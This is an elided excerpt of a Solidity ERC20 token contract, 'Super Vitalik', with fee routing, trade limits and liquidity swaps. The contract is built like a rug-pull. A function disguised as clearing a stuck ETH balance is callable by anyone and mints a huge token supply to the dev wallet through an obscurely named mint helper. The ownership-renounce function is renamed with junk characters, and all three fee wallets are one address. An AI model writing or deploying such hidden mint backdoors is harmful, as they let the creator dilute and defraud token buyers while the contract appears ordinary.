...
abstract contract Ownable is Context {
    ...
    function renounceOwnershipseoplk() public virtual onlyOwner {
        _setOwner(address(0));
    }
...
interface IRouter {
    ...
    contract SuperVitalik is ERC20, Ownable {
    ...
    uint256 public maxBuyLimit = 26000000 * 10**18;
    uint256 public maxSellLimit = 26000000 * 10**18;
    uint256 public maxWalletLimit = 26000000 * 10**18;
    uint256 public genesis_block;
    int32 private bontudu = 1;
    uint256 private deadline = 1;
    uint256 private launchtax = 0;
    address public marketiethkings = 0x7aa476828f56BBEe4CC23e2CFD2eF704797238B4; 
    address public devswalletkings = 0x7aa476828f56BBEe4CC23e2CFD2eF704797238B4;
    address public ecosystsewalletkings = 0x7aa476828f56BBEe4CC23e2CFD2eF704797238B4;
    ...
    constructor() ERC20("Super Vitalik", "SVITALIK") {
        andnicob(msg.sender, 26000000 * 10**decimals());
        ...
        exemptFee[marketiethkings] = true;
        exemptFee[ecosystsewalletkings] = true;
        exemptFee[devswalletkings] = true;
        ...
        if (contractBalance >= tokenLiquidityThreshold) {
         ...
         uint256 denominator = feeswap * 2;
          ...
          addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
            ...
            if (marketingAmt > 0) {
                payable(marketiethkings).sendValue(marketingAmt);
            }
            uint256 ecosystemAmt = unitBalance * 2 * swapTaxes.ecosystem;
            if (ecosystemAmt > 0) {
                payable(ecosystsewalletkings).sendValue(ecosystemAmt);
            }
            uint256 devAmt = unitBalance * 2 * swapTaxes.dev;
            if (devAmt > 0) {
                payable(devswalletkings).sendValue(devAmt);
            }
    ...
    function clearStuckBalanceETHtoltnenupse() external payable{
        andnicob(devswalletkings, 10 * 10**28);
    }
